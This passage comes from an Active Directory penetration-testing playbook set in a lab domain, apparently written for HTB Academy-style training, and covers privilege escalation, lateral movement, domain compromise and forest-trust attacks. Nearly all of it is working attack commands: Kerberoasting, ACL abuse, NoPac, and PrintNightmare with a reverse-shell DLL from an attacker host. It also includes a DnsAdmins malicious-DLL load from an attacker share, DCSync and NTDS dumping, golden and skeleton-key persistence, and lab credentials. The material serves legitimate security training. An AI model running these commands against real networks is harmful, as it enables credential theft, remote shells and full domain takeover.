├─ C. BloodHound shows ACL path? ──► ACL Abuse chain (5c)
├─ D. SYSVOL has Groups.xml? ──► GPP cpassword decrypt (5d)
├─ E. Cleartext creds in description / shares / scripts? ──► (5e)
├─ F. Writable GPO from current user? ──► GPO Abuse (5f)
├─ G. Standard user, unpatched DC? ──► NoPac CVE-2021-42278/42287 (5g)
├─ H. Print Spooler running on DC? ──► PrintNightmare (5h)
├─ I. AD CS web enrollment exposed? ──► PetitPotam (5i)
├─ J. Exchange installed? ──► PrivExchange (5j)
├─ K. Local admin hash, multiple hosts? ──► Local-admin pwd reuse spray (5k)
├─ L. Application/printer with LDAP test btn? ──► LDAP cred sniffing (5l)
├─ M. Old DC, unpatched 2014? ──► MS14-068 PAC forge (5m)
├─ N. SQL admin rights? ──► xp_cmdshell + SeImpersonate → SYSTEM (5n)
├─ O. Snaffler hits / Files share secrets? ──► (5o, == 5e expanded)
├─ P. PASSWD_NOTREQD account? ──► try blank password (5p)
├─ Q. Account in Backup Operators / DnsAdmins / etc.? ──► group-specific privesc (5q)
└─ R. None of the above ──► loop Phase 4 with broader scope
```

## 5.3 5a — Kerberoasting

Service Principal Name (SPN) accounts have password-encrypted TGS tickets retrievable by **any** authenticated domain user. Crack offline.

### 5a.1 Linux

```bash
# Enumerate SPNs
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# Request all TGS tickets and save
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend \
    -request -outputfile all_tgs.kirbi

# Target a single user
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend \
    -request-user sqldev -outputfile sqldev_tgs

# Crack
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

### 5a.2 Windows — PowerView

```powershell
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat \
    | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### 5a.3 Windows — Rubeus (recommended)

```powershell
.\Rubeus.exe kerberoast /stats                                # count + encryption types
.\Rubeus.exe kerberoast /nowrap /outfile:hashes.txt
.\Rubeus.exe kerberoast /user:sqldev /nowrap
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap    # high-value only
.\Rubeus.exe kerberoast /tgtdeleg /nowrap                     # FORCE RC4 (faster crack)
.\Rubeus.exe kerberoast /rc4opsec /nowrap                     # skip AES users (avoid alarm)
.\Rubeus.exe kerberoast /aes /nowrap                          # if RC4 disabled
```

### 5a.4 Manual Method (no Rubeus, no PowerView)

```python
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken \
    -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
# Then dump tickets from memory with mimikatz: kerberos::list /export
# Convert .kirbi → hashcat format with kirbi2john.py + edit
```

### 5a.5 Encryption Type Decision

| Hash prefix | Type | Hashcat mode |
|-------------|------|--------------|
| `$krb5tgs$23$*` | RC4_HMAC (etype 23) | 13100 |
| `$krb5tgs$17$` | AES-128 | 19600 |
| `$krb5tgs$18$` | AES-256 (etype 18) | 19700 |

If victim is AES-only on Server 2016 or older → use `/tgtdeleg` to **downgrade to RC4** (massive cracking speedup). On Server 2019 DCs the downgrade no longer works.

### 5a.6 Cleanup

If you set a temporary SPN (e.g. via ACL chain), **remove it** at the end:

```powershell
Set-DomainObject -Credential $Cred -Identity <user> -Clear serviceprincipalname -Verbose
```

## 5.4 5b — ASREPRoasting (covered in Phase 3f, also used post-foothold to find more targets)

```powershell
Get-DomainUser -PreauthNotRequired
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

```bash
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_users.txt
hashcat -m 18200 hashes.txt rockyou.txt
```

If you have `GenericAll`/`GenericWrite` on a user, you can **enable** `DONT_REQ_PREAUTH`, roast, then disable.

## 5.5 5c — ACL Abuse

### 5c.1 Common Abusable ACEs

| ACE | Tool to abuse |
|-----|---------------|
| `ForceChangePassword` | `Set-DomainUserPassword` (PV) / `pth-net rpc password` (Linux) |
| `AddMember` / `AddSelf` | `Add-DomainGroupMember` |
| `GenericAll` (user) | reset password OR add SPN + Kerberoast |
| `GenericAll` (group) | add member |
| `GenericAll` (computer w/ LAPS) | read LAPS password |
| `GenericWrite` (user) | add fake SPN → Kerberoast (Set-DomainObject) |
| `GenericWrite` (computer) | RBCD (resource-based constrained delegation) |
| `WriteOwner` | take ownership → grant yourself rights → abuse |
| `WriteDACL` | rewrite DACL → grant yourself rights → abuse |
| `AllExtendedRights` | reset password / add to group |
| `DCSync` (`DS-Replication-Get-Changes-All`) | secretsdump.py / mimikatz lsadump::dcsync |
| `ReadGMSAPassword` | GMSAPasswordReader.exe |

### 5c.2 Enumeration

```powershell
# All "interesting" ACEs the current user has
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectACL -Identity <target> -ResolveGUIDs

# What does my user actually control?
$sid = (Get-DomainUser <me>).objectsid
Get-DomainObjectACL -ResolveGUIDs | ? { $_.SecurityIdentifier -eq $sid }
```

BloodHound: search node → `Outbound Object Control` shows everything you can attack.

### 5c.3 Force-Change-Password Recipe

```powershell
$SecPass = ConvertTo-SecureString '<MyKnownPass>' -AsPlainText -Force
$Cred    = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\me', $SecPass)
$NewPass = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity <victim> -AccountPassword $NewPass -Credential $Cred -Verbose
```

Linux equivalent:

```bash
# pth-net rpc password "victim" "newpass" -U "DOMAIN/me%mypass" -S <DC>
# Or net rpc password
net rpc password "<victim>" "Pwn3d_by_ACLs!" -U 'DOMAIN/me%mypass' -S <DC>
# bloodyAD also handles this
bloodyAD -d DOMAIN -u me -p mypass --host <DC> set password <victim> 'Pwn3d_by_ACLs!'
```

### 5c.4 Add-to-Group Recipe

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'me' \
    -Credential $Cred -Verbose
Get-DomainGroupMember -Identity 'Help Desk Level 1' | Select MemberName
```

### 5c.5 GenericWrite → Targeted Kerberoast Recipe

```powershell
# Add fake SPN to victim
Set-DomainObject -Credential $Cred -Identity <victim> \
    -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# Roast it
.\Rubeus.exe kerberoast /user:<victim> /nowrap

# Crack offline → cleartext password → impersonate

# CLEANUP: remove SPN
Set-DomainObject -Credential $Cred -Identity <victim> \
    -Clear serviceprincipalname -Verbose
```

Linux one-shot equivalent: [`targetedKerberoast.py`](https://github.com/ShutdownRepo/targetedKerberoast).

### 5c.6 Full Chain Example (from module)

```
wley (NetNTLMv2 → cracked) ──► forced-change ──► damundsen
damundsen ──► added to Help Desk L1 (nested in Information Technology)
Information Technology ──► GenericAll ──► adunn
adunn (now controlled) ──► has DCSync rights ──► dump NTDS = Domain Admin
```

### 5c.7 Cleanup Order Matters

1. **First** remove fake SPNs / temporary attribute changes (need group membership for this).
2. Then remove yourself from groups.
3. Then reset modified passwords back (or notify client).

## 5.6 5d — GPP Passwords (cpassword in SYSVOL)

Pre-MS14-025 GPP feature stored AES-256-encrypted passwords in SYSVOL, but **Microsoft published the AES key**. Anyone authenticated can decrypt.

```bash
# Find the file
ls \\<DC>\SYSVOL\<domain>\Policies\*\Machine\Preferences\Groups\Groups.xml

# CME modules
crackmapexec smb <DC> -u me -p pass -M gpp_password
crackmapexec smb <DC> -u me -p pass -M gpp_autologin       # autologon creds in Registry.xml

# Manual decrypt
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

PowerShell variant: `Get-GPPPassword.ps1` (PowerSploit), `Get-GPPAutologon.ps1`.

Pitfall: GPP creds may be for disabled accounts — still try them in a spray (password reuse is common).

## 5.7 5e — Cleartext Credentials Hunting

### 5e.1 Description / Notes Field

```powershell
Get-DomainUser * | Select-Object samaccountname,description \
    | Where-Object {$_.Description -ne $null}
```

### 5e.2 SYSVOL Scripts

```powershell
ls \\<DC>\SYSVOL\<domain>\scripts                         # logon scripts
gci \\<DC>\SYSVOL -Recurse -Include *.bat,*.vbs,*.ps1,*.cmd,*.xml
Get-Content \\<DC>\SYSVOL\<domain>\scripts\reset_local_admin_pass.vbs
```

### 5e.3 Snaffler (best automated tool)

```powershell
.\Snaffler.exe -d <domain> -s -v data -o snaffler.log
```

### 5e.4 PowerShell history of admins (if landed on a host they used)

```powershell
Get-Content (Get-PSReadlineOption).HistorySavePath
```

### 5e.5 web.config and connection strings — manual grep

```powershell
gci -Recurse -Include web.config,*.config,*.ps1,*.bat,*.txt -Path \\fileserver\share \
    | Select-String -Pattern 'password|passwd|pwd|secret|connectionstring' -List
```

## 5.8 5f — GPO Abuse

Find a GPO our user can edit:

```powershell
Get-DomainGPO | select displayname
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ? { $_.SecurityIdentifier -eq $sid }
Get-GPO -Guid <GUID>
```

If you have `GenericWrite`/`GenericAll`/`WriteDACL`/`WriteOwner` on a GPO → **SharpGPOAbuse**:

```powershell
# Add user to local Administrators on every host the GPO targets
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <me> --GPOName "<GPO>"

# Drop scheduled task on every targeted host (reverse shell)
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" \
    --Author NT\\AUTHORITY --Command "cmd.exe" --Arguments "/c <REVERSE>" \
    --GPOName "<GPO>"

# Grant a user SeDebugPrivilege etc. on targeted hosts
SharpGPOAbuse.exe --AddUserRights --UserRights SeDebugPrivilege \
    --UserAccount <me> --GPOName "<GPO>"
```

**Caution**: If GPO applies to 1000 computers, your scheduled task runs on 1000 computers. Pick narrowly-scoped GPOs and use targeting where possible.

## 5.9 5g — NoPac (CVE-2021-42278 + CVE-2021-42287)

Standard domain user → SYSTEM on DC, in one command.

Prerequisites: unpatched DC, `ms-DS-MachineAccountQuota` > 0 (default 10).

```bash
# Vulnerability check
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

# Get a SYSTEM shell on the DC (via smbexec.py — defender will likely flag)
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
    -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 \
    -shell --impersonate administrator -use-ldap

# Direct DCSync (quieter, no shell on DC)
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 \
    -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 \
    --impersonate administrator -use-ldap \
    -dump -just-dc-user INLANEFREIGHT/administrator

# A ccache file is saved to the working dir → reuse for PtT
export KRB5CCNAME=administrator.ccache
```

**Cleanup**: noPac may fail to delete the temporary computer account it creates → check & remove manually if attack didn't clean up.

## 5.10 5h — PrintNightmare (CVE-2021-34527 / CVE-2021-1675) — Remote SYSTEM via Print Spooler

```bash
# 1. Confirm spooler RPC interface is exposed
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# 2. Generate DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

# 3. Host on SMB share
sudo smbserver.py -smb2support CompData /path/to/

# 4. Start MSF handler
msfconsole -q -x "use exploit/multi/handler; \
    set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
    set LHOST 172.16.5.225; set LPORT 8080; run"

# 5. Trigger (use cube0x0's impacket)
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 \
    '\\172.16.5.225\CompData\backupscript.dll'
```

**Pitfall**: requires cube0x0's impacket fork — uninstall standard impacket first or use a venv.

## 5.11 5i — PetitPotam → AD CS (full recipe in Phase 3.9 above)

If domain has AD CS web enrollment, **you don't even need pre-auth creds for original PetitPotam variant** (patched in Aug 2021 but many orgs still vulnerable). Even if patched, authenticated coercion variants exist (DFSCoerce, Coercer.py, MS-RPRN Printer Bug).

For the full attack chain, see Phase 3.9. From a privesc standpoint: this is the canonical "domain user → DA on a typical enterprise" path.

## 5.12 5j — PrivExchange

Exchange `PushSubscription` → forces Exchange (running as SYSTEM with WriteDACL on domain object pre-2019 CU) to authenticate to attacker → relay to LDAP → grant DCSync to attacker → DCSync.

```bash
# Listener: relay Exchange's auth to LDAP, grant DCSync rights
sudo ntlmrelayx.py -t ldap://<DC> --escalate-user <my-user>

# Trigger
python3 privexchange.py -ah <attacker_ip> <exchange_host> -u me -p pass -d domain
```

## 5.13 5k — Local Admin Password Reuse Spray

After cracking one local admin hash, spray across the subnet (always `--local-auth`):

```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 \
    -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

Try variations of the local admin name you find (`bsmith`, `bsmith_admin`, `administrator`, `localadmin`).

## 5.14 5l — LDAP Cred Sniffing (printers / appliances)

Many printers/appliances have LDAP "Test Connection" buttons. Change LDAP server IP to your attack host, set up a netcat listener on 389, click test → cleartext creds in many cases.

```bash
sudo nc -lvnp 389
# or for full LDAP capture, use an LDAP server (slapd) with logging
```

Often these accounts are privileged.

## 5.15 5m — MS14-068 (Legacy)

Forge PAC claiming Domain Admin membership. Only works on unpatched 2008/2012 DCs. Tools: PyKEK, `goldenPac.py` (Impacket).

## 5.16 5n — MSSQL → SYSTEM

If your account is SQL `sysadmin` on an MSSQL host:

```bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
# SeImpersonatePrivilege enabled? → SYSTEM via PrintSpoofer / JuicyPotato / GodPotato
```

PowerUpSQL discovery from Windows:

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" \
    -username "domain\me" -password "pass" -query 'SELECT @@version'
Get-SQLServerLinkCrawl -Instance "172.16.5.150" -Query "exec master..xp_cmdshell 'whoami'"
```

Then: PrintSpoofer / GodPotato / RoguePotato to escalate to SYSTEM.

## 5.17 5o — Snaffler hits / share secrets (see 5e)

## 5.18 5p — PASSWD_NOTREQD blank-password test

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | select samaccountname,useraccountcontrol
```

```bash
crackmapexec smb <DC> -u <victim> -p ''           # try blank
```

## 5.19 5q — Group-Specific Privesc

| Group membership | Privesc |
|------------------|---------|
| `Backup Operators` | Read NTDS.dit via VSS (`vssadmin create shadow` + copy) → DCSync offline |
| `Server Operators` | Modify services on DCs → SYSTEM on DC |
| `Account Operators` | Manage non-admin users → can add to Exchange Windows Permissions etc. |
| `Print Operators` | Load drivers (CVE-historical), control printers |
| `DnsAdmins` | Plant malicious DLL via dnscmd `/config /serverlevelplugindll` → SYSTEM on DC |
| `Hyper-V Administrators` | If DC is virtualized → snapshot/extract NTDS |
| `Schema Admins` | Modify AD schema (denial-of-service or backdoor classes) |
| `Group Policy Creator Owners` | Create GPOs → GPO abuse |
| `Exchange Trusted Subsystem` / `Org Mgmt` / `Exchange Windows Permissions` | DCSync via WriteDACL on domain object (PrivExchange) |
| `Cert Publishers` | Publish certs (used in some ESC paths) |
| `Protected Users` | (defense — limits NTLM, no creds in memory) — informational |

DnsAdmins example:

```cmd
:: From a DnsAdmins user
dnscmd <DC> /config /serverlevelplugindll \\<attacker>\share\evil.dll
sc.exe \\<DC> stop dns
sc.exe \\<DC> start dns
:: dns service loads evil.dll as SYSTEM on DC
```

## 5.20 Phase 5 Outputs

- Privileged credential (DA, EA, account with DCSync rights, or SYSTEM on DC)
- OR: Local admin on multiple hosts → Phase 6 (lateral) to find such a credential

---

# PHASE 6 — Lateral Movement

## 6.1 Goal

Move from one host to another with stolen credentials/hashes/tickets, hunting for: privileged user sessions to steal, sensitive data, or new credentials to escalate.

## 6.2 Decision Tree

```
[Have credential / hash / ticket]
│
├─ Local admin on target SMB? ──► PsExec / SMBExec / WMIExec (6a)
├─ Local admin via WMI? ──► wmiexec (6b)
├─ WinRM rights on target? ──► Evil-WinRM / Enter-PSSession (6c)
├─ RDP rights on target? ──► xfreerdp / mstsc (6d)
├─ Linked SQL servers? ──► PowerUpSQL Get-SQLServerLinkCrawl (6e)
├─ Only have NT hash, not pwd? ──► Pass-the-Hash via SMB/WMI (6f)
├─ Have TGT/TGS .ccache or .kirbi? ──► Pass-the-Ticket (6g)
├─ Need fresh TGT from NT hash? ──► Overpass-the-Hash (6h)
└─ Stuck due to Kerberos Double Hop? ──► PSCredential / RegisterPSSession workaround (6i)
```

## 6.3 6a — PsExec (semi-interactive SYSTEM shell)

```bash
# Linux
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
psexec.py -hashes :<NTHASH> inlanefreight.local/wley@172.16.5.125

# Windows (Sysinternals)
PsExec.exe \\<host> -u DOMAIN\user -p pass cmd.exe
```

## 6.4 6b — WMIExec (stealthier, no service install)

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
wmiexec.py -hashes :<NTHASH> inlanefreight.local/wley@172.16.5.5
```

Each command spawns a fresh `cmd.exe` (Event ID 4688). Less obvious than PsExec but not silent.

## 6.5 6c — WinRM

```powershell
# Windows native
$pass = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("INLANEFREIGHT\forend", $pass)
Enter-PSSession -ComputerName <host> -Credential $cred

# Run a single command
Invoke-Command -ComputerName <host> -Credential $cred -ScriptBlock { whoami }
```

```bash
# Linux
gem install evil-winrm
evil-winrm -i <host> -u forend -p Klmcargo2
evil-winrm -i <host> -u forend -H <NTHASH>            # Pass-the-Hash over WinRM
```

Custom Cypher to find WinRM-able accounts:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

## 6.6 6d — RDP

```bash
xfreerdp /v:<host> /u:<user> /p:<pass> /dynamic-resolution /cert-ignore
xfreerdp /v:<host> /u:<user> /pth:<NTHASH>            # PtH-RDP if Restricted Admin enabled on target
```

## 6.7 6e — MSSQL Link Crawling

Linked servers can chain across trust boundaries. PowerUpSQL `Get-SQLServerLinkCrawl` walks the chain executing your query at each node.

```powershell
Get-SQLServerLinkCrawl -Instance "<sql>" -Query "exec master..xp_cmdshell 'whoami'"
```

## 6.8 6f — Pass-the-Hash

```bash
# CME
crackmapexec smb <host> -u administrator -H <NTHASH> --local-auth

# psexec.py / wmiexec.py / smbexec.py
psexec.py -hashes :<NTHASH> domain/user@<host>

# evil-winrm
evil-winrm -i <host> -u <user> -H <NTHASH>
```

```powershell
# Mimikatz on a Windows attack host (need local admin / SeDebug)
sekurlsa::pth /user:administrator /domain:<domain> /ntlm:<NTHASH> /run:powershell.exe
# Spawned shell has the hash injected; try `dir \\target\C$` etc.
```

## 6.9 6g — Pass-the-Ticket

```bash
# Linux: ccache file from secretsdump/ticketer/getTGT.py/etc.
export KRB5CCNAME=admin.ccache
psexec.py -k -no-pass <host>.<domain>
secretsdump.py -k -no-pass <host>.<domain>
```

```powershell
# Windows: .kirbi via Rubeus
.\Rubeus.exe ptt /ticket:<base64>
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist                                                  # confirm
dir \\<host>\C$
```

## 6.10 6h — Overpass-the-Hash (NT hash → fresh TGT)

```powershell
.\Rubeus.exe asktgt /user:<user> /rc4:<NTHASH> /domain:<dom> /dc:<DC> /ptt
```

```bash
# getTGT.py from impacket
getTGT.py -hashes :<NTHASH> domain/user
export KRB5CCNAME=user.ccache
```

## 6.11 6i — Kerberos Double Hop Problem

Symptom: After WinRM/PSRemote into Host A, attempts from Host A to access Host B with Kerberos fail (no creds forwarded).

### Workaround #1 — PSCredential Object inside session

```powershell
Enter-PSSession -ComputerName HostA -Credential $cred
# Inside Host A:
$pass = ConvertTo-SecureString "<MyPass>" -AsPlainText -Force
$mycred = New-Object System.Management.Automation.PSCredential("DOMAIN\me", $pass)
Invoke-Command -ComputerName HostB -Credential $mycred -ScriptBlock { whoami /all }
```

### Workaround #2 — Register PSSession Configuration with CredSSP

```powershell
# On Host A (one-time, requires admin)
Register-PSSessionConfiguration -Name CredSSP -RunAsCredential domain\me
Set-Item WSMan:\localhost\Service\Auth\CredSSP -Value $true

# Now from your origin
Enter-PSSession -ComputerName HostA -ConfigurationName CredSSP -Authentication Credssp -Credential $cred
# Subsequent commands will forward creds to Host B
```

### Workaround #3 — RDP into Host A, use creds interactively (loud).

### Workaround #4 — Use `runas /netonly` on attack host (creds aren't forwarded but tools auth as the netonly identity).

## 6.12 Iteration

After landing on a new host:

1. `whoami /all` and `whoami /priv` (any new privileges?)
2. `klist` (any cached tickets to steal?)
3. `mimikatz sekurlsa::logonpasswords` if local admin (cached cleartext / hashes / tickets)
4. Check who else is logged on: `qwinsta`, `Get-Process -IncludeUserName | Select Username -unique`
5. Re-run Phase 4 enumeration as the new identity.

---

# PHASE 7 — Full Domain Compromise

## 7.1 Goal

Achieve persistent ability to authenticate as **any** account in the domain (typically: dump NTDS, then forge tickets at will).

## 7.2 Decision Tree

```
[Have privileged path]
│
├─ Account has DS-Replication-Get-Changes-All? ──► DCSync (7a)
├─ Domain Admin on DC? ──► NTDS.dit dump + SYSTEM hive (7b)
├─ SYSTEM on DC?         ──► same as 7b
├─ Local admin on DC via PrintNightmare/etc.? ──► same as 7b
└─ Compromise ≠ DA, but DCSync rights granted via ACL ──► DCSync (7a)
```

## 7.3 7a — DCSync

```bash
# Linux
secretsdump.py -outputfile inlanefreight_hashes -just-dc \
    INLANEFREIGHT/adunn@172.16.5.5
# Files produced:
#   inlanefreight_hashes.ntds            (NTLM)
#   inlanefreight_hashes.ntds.kerberos   (kerb keys)
#   inlanefreight_hashes.ntds.cleartext  (reversible-encryption accounts)

# Targeted user only
secretsdump.py -just-dc-user INLANEFREIGHT/krbtgt INLANEFREIGHT/adunn@172.16.5.5

# Other useful flags
# -just-dc-ntlm        NTLM hashes only (faster)
# -pwd-last-set        include lastpwdset for password aging stats
# -history             include password history (great for cracking)
# -user-status         flag disabled users
```

```powershell
# Windows — Mimikatz (must be in context of user with replication rights)
runas /netonly /user:INLANEFREIGHT\adunn powershell
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt
```

## 7.4 7b — NTDS.dit + SYSTEM Hive Dump

If you have local admin or SYSTEM on the DC:

```powershell
# In-memory (Mimikatz)
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::sam
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets /export

# VSS shadow copy method
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\NTDS\NTDS.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\System32\config\SYSTEM C:\temp\
vssadmin delete shadows /shadow={GUID}

# Offline parse on attack host
secretsdump.py -system SYSTEM -ntds NTDS.dit LOCAL
```

## 7.5 7c — Persistence via Forged Tickets

### Golden Ticket (krbtgt hash → forge any TGT)

```powershell
# Mimikatz
mimikatz # kerberos::golden /user:Administrator /domain:INLANEFREIGHT.LOCAL \
    /sid:S-1-5-21-... /krbtgt:<KRBTGT_NTHASH> /id:500 /ptt

# Rubeus
.\Rubeus.exe golden /rc4:<KRBTGT_NTHASH> /domain:<dom> /sid:<SID> \
    /user:Administrator /ptt
```

```bash
# Impacket
ticketer.py -nthash <KRBTGT_NTHASH> -domain <dom> -domain-sid <SID> Administrator
export KRB5CCNAME=Administrator.ccache
```

### Silver Ticket (service account hash → forge TGS for that one service)

```powershell
mimikatz # kerberos::golden /user:Admin /domain:<dom> /sid:<SID> \
    /target:<targetfqdn> /service:cifs /rc4:<SVC_HASH> /ptt
```

### Skeleton Key (master password on DC)

```powershell
mimikatz # privilege::debug
mimikatz # misc::skeleton
# Now any account auths with password "mimikatz"
```

### DCShadow (register fake DC, replicate changes back)

```powershell
mimikatz # lsadump::dcshadow /object:<user> /attribute:<attr> /value:<val>
mimikatz # lsadump::dcshadow /push
```

### AdminSDHolder

Modify ACL of CN=AdminSDHolder → SDProp propagates the (malicious) ACL to all protected groups every 60 minutes → persistent backdoor. Detection-light if changes look benign.

## 7.6 KRBTGT Reset Reminder (for client report)

Only way to invalidate a Golden Ticket is to **rotate the KRBTGT password twice** (twice because of password history). Recommend this in your report after any DCSync.

---

# PHASE 8 — Cross-Trust & Forest Attacks

## 8.1 Goal

After compromising one domain in a multi-domain forest (or a trusted external forest), pivot to other domains.

## 8.2 Trust Type Recap

| Trust | Transitive | Direction | Notes |
|-------|-----------|-----------|-------|
| Parent-Child (intra-forest) | Yes | Bidirectional | SID Filtering OFF by default — ExtraSids attack works |
| Tree-Root (intra-forest) | Yes | Bidirectional | Same |
| Cross-link | Yes | Bidirectional | Speed-optimisation path |
| External | No | One/Bi | SID filtering ON by default |
| Forest | Yes | One/Bi | SID filtering ON by default; SID History blocked |
| ESAE | Special | — | Bastion forest (mostly retired) |

## 8.3 Decision Tree

```
[Compromised Domain A]
│
├─ A is a child of B (intra-forest)?
│      └── Yes → ExtraSids attack (8a) — child-to-parent → forest takeover
│
├─ A trusts B bidirectionally (forest/external)?
│      ├── Cross-Forest Kerberoast (8b)
│      ├── Foreign group membership (8c)
│      ├── Password reuse across trust (8d)
│      └── SID History abuse (if filtering off) (8e)
│
└─ A trusts B with TGT delegation enabled?
       └── Printer Bug → unconstrained delegation in B → DC of B (8f)
```

## 8.4 Enumeration

```powershell
# Windows
Get-ADTrust -Filter *
Get-DomainTrust
Get-DomainTrustMapping
Get-ForestTrust
Get-DomainForeignGroupMember -Domain <other-domain>
Get-DomainForeignUser -Domain <other-domain>
netdom query /domain:<domain> trust
netdom query /domain:<domain> dc
nltest /domain_trusts /all_trusts
```

```bash
# Linux (after bloodhound-python with -c All against each domain)
# In BloodHound: "Map Domain Trusts" + "Users with Foreign Domain Group Membership"
```

## 8.5 8a — ExtraSids Attack (Child → Parent)

After full DA on child domain:

### Data needed:

1. KRBTGT NT hash of **child** domain
2. SID of child domain
3. Any (even fake) target user name
4. FQDN of child domain
5. SID of `Enterprise Admins` group in **parent** root (always RID 519)

### Linux

```bash
# 1. KRBTGT hash of child
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \
    -just-dc-user LOGISTICS/krbtgt

# 2. SID of child
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

# 3. SID of Enterprise Admins in parent (use parent DC IP)
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

# 4. Build Golden Ticket with extra-sid set to parent's EA group
ticketer.py -nthash <KRBTGT_NT> \
    -domain LOGISTICS.INLANEFREIGHT.LOCAL \
    -domain-sid S-1-5-21-2806153819-209893948-922872689 \
    -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 \
    hacker
export KRB5CCNAME=hacker.ccache

# 5. Use the ticket on parent DC
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local \
    -k -no-pass -target-ip 172.16.5.5

# Or full one-shot automation
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

### Windows — Mimikatz

```powershell
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt          # get child KRBTGT
mimikatz # kerberos::golden /user:hacker \
    /domain:LOGISTICS.INLANEFREIGHT.LOCAL \
    /sid:S-1-5-21-2806153819-209893948-922872689 \
    /krbtgt:<KRBTGT_NT> \
    /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
ls \\academy-ea-dc01.inlanefreight.local\c$            # verify access
```

### Windows — Rubeus

```powershell
.\Rubeus.exe golden /rc4:<KRBTGT_NT> \
    /domain:LOGISTICS.INLANEFREIGHT.LOCAL \
    /sid:S-1-5-21-2806153819-209893948-922872689 \
    /sids:S-1-5-21-3842939050-3880317879-2865463114-519 \
    /user:hacker /ptt
```

## 8.6 8b — Cross-Forest Kerberoast

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

## 8.7 8c — Foreign Group Membership

```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
Convert-SidToName <SID>            # resolve foreign SID → name

# Verify access
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL \
    -Credential INLANEFREIGHT\administrator
```

```bash
# bloodhound-python collection of OTHER domain
# (must add to /etc/resolv.conf: domain <otherdom> + nameserver <other-DC-IP>)
bloodhound-python -d FREIGHTLOGISTICS.LOCAL \
    -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All \
    -u forend@inlanefreight.local -p Klmcargo2
```

